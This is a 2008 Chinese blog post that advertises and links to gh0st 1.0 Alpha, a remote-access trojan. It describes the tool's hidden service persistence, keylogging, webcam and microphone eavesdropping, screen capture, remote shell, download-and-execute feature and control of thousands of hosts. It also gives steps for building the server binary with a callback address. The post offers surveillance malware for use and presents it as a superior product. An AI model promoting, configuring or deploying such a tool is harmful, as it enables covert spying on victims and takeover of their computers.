---
title: gh0st 1.0 Alpha 全新亮相
description: C.RufusSecurityTeam红狼安全小组最新作品gh0st1.0Alpha全新亮相gh0st1.0AlphaMD5:C23C070211CB9C442B1A7BBA556555A6支持2000/xp/2003/Vista修正gh0st3.6老版本N多BUG,全新的技术.全新的外观.兼容特性:  控制端采用unicode编译，全英文界面，支持任何国家的语言，任何语言平台的操作系统
date: 2008-12-15 09:32:00
category: 安全工具
tags: ['gh0st', '远程控制']
post_id: 716
alias: gh0st-1.0-Alpha
ViewNums: 6418
---

C.Rufus Security Team 红狼安全小组最新作品 **[gh0st 1.0 Alpha 全新亮相](/blog/gh0st-10-alpha)**

gh0st 1.0 Alpha MD5: C23C070211CB9C442B1A7BBA556555A6
支持2000/[xp](/blog/deepin-litexp-windows-xp-sp3-v62)/2003/Vista 修正gh0st 3.6 老版本N多BUG,全新的技术.全新的外观.

兼容特性:  控制端采用unicode编译，全英文界面，支持任何国家的语言，任何语言平台的操作系统
[![](http://www.wolfexp.net/forum/attachment.php?aid=3673)](/blog/gh0st-10-alpha)
屏幕传输:  改良的扫描算法，最快可达到150帧/秒，灰鸽子，[PcShare](/blog/112a),等远控，远远落后， 改良的差异算法，适合低带宽网络，其它远控占用带宽200K/s的情况下，gh0st只占用20K/s,有实图为证
[![](http://www.wolfexp.net/forum/attachment.php?aid=3674)](/blog/gh0st-10-alpha)
下面为gh0st屏幕传输时采用差异算法所占流量
[![](http://www.wolfexp.net/forum/attachment.php?aid=3688)](/blog/gh0st-10-alpha)
同样页面pcshare所点带宽居然为gh0st的10倍还要多
[![](http://www.wolfexp.net/forum/attachment.php?aid=3675)](/blog/gh0st-10-alpha)
视频传输:  功能强大，xvid压缩方式，把视频压缩成电影格式，图像清晰无比，占用带宽最高23K/s,同样的远控，鸽子，ps,占300K/s,600K/s或者更高，支持USB、非USB、有驱、无驱摄像头
[![](http://www.wolfexp.net/forum/attachment.php?aid=3676)](/blog/gh0st-10-alpha)
下面为gh0st视频传输所占流量和画面质量
[![](http://www.wolfexp.net/forum/attachment.php?aid=3677)](/blog/gh0st-10-alpha)
下面为pcshare画面质量与带宽，明显，画面质量不如gh0st,占用带宽是gh0st的3倍以上，相当无耻, 实际操作可发现画面流畅速度也不如gh0st
[![](http://www.wolfexp.net/forum/attachment.php?aid=3678)](/blog/gh0st-10-alpha)
下面为灰鸽子，更不入目，画面质量差之外，占用带宽比ps更惊人
[![](http://www.wolfexp.net/forum/attachment.php?aid=3679)](/blog/gh0st-10-alpha)

声音传输:  自带的优秀音频压缩算法，带宽稳定在1K/s,传输流畅，网络稳定的情况下无延迟，音频示波显示，可以监听对方的输入或者输出声音，只要把输入方式，选择为“立体声混音”，或者
           "stereo mix",就可以监听声卡输出的声音. 不同的声卡有不同的描述，

文件管理:  人性化的设计,不多说了,看图

[![](http://www.wolfexp.net/forum/attachment.php?aid=3684)](/blog/gh0st-10-alpha)

键盘记录: 准确记录英文,中文,各国语言
[![](http://www.wolfexp.net/forum/attachment.php?aid=3686)](/blog/gh0st-10-alpha)

远程终端: 一个稳定,简单的shell
[![](http://www.wolfexp.net/forum/attachment.php?aid=3687)](/blog/gh0st-10-alpha)

集群控制:  改良的IOCP内核，支持上千个服务端同时控制，操作流畅，同性质的远控，与之不能相提并论。
程序稳定:  服务端才用正规方式注册服务，服务如果发现异常，如自动中止，或者其它情况，会自动重启服务，重新上线。
分组功能:  人性化设计，生成服务端时可以选择分组名，服务端上线后，可以更分组，随意，方便，简洁
清爽外观:  采用世界知名的Xtreme界面开发SDK工具包，程序界面，清爽入目，实为极品。
看不见的:  程序设计模式才用作者改良过的Facade模式，一流的消息分发机制，代码清晰简明................
内存管理:  同时控制上千台主机的情况下，自动管理内存，提高效率

使用方法:
[![](http://www.wolfexp.net/forum/attachment.php?aid=3681)](/blog/gh0st-10-alpha)
如果为IP上线，请在DNS/IP里输入要上线的IP地址或者域名，后面填上端口号，勾去URL选项，点击Build就可生成无壳服务端
如果为URL上线，请勾选URL，后面输入URL地址，点击Build生成，URL文件里的内容为对话框最下面GH0ST...GH0STC的字串
注意，此字串是由DNS/IP和端口生成的，把要上线的IP和端口写入，字串会自动生成

系统设置:

在菜单栏里可以配置系统端口，和是否启用上线气泡提示功能

以下为功能全部介绍:

文件管理  文件、文件夹批量上传、删除、下载、创建、重命名
屏幕监视  扫描算法速度最快可达到120帧/秒，差异算法适合网络极差的情况下传输,传输速度快，控制屏幕，发送Ctrl+Alt+Del，剪贴板操作，7种色彩显示方式,等......
键盘记录  可记录中英文信息，离线记录(记录上限50M)功能
远程终端  一个简单shell
系统管理  进程管理，窗口管理
视频查看  查看远程摄像头,全新xvid压缩方式，自带压缩库，可以录像，可以打开其它远控打不开的摄像头，支持USB、非USB、有驱、无驱摄像头
语音监听  监听远程语音,同时也可以把本地语音传送给远程,进行语音聊天, 可以记录语音量，控制声音输入方式，支持多声卡。音频示波显示，自带g729a压缩库，压缩方式,传输流畅
会话管理  注销，重启，关机，卸载服务端
其它功能  下载执行指定URL中的程序，隐藏或者显示访问指定网址
地址位置  将IP数据库文件QQWry.Dat放置程序同目录下即可显示地理位置
集群控制  可同时控制多台主机，同时打开视频监控等管理功能
分组功能  上线后自动创建分组，可随意更改，移动
备注功能  为主机添加自定义备注

【下载地址】[gh0st 1.0 Alpha 全新版](/blog/download.asp?id=237

原来的稳定版：
[Gh0st RAT Beta 3.6开源 - 源代码免费下载](/blog/gh0st-rat-beta-36-open-source)
[Gh0st RAT Beta 2.5 开源-红狼远控](/blog/gh0st-rat-beta-25-open-source)
[Gh0st RAT——红狼安全小组最新远程控制软件](/blog/gh0st-rat-c-rufus-security-team)

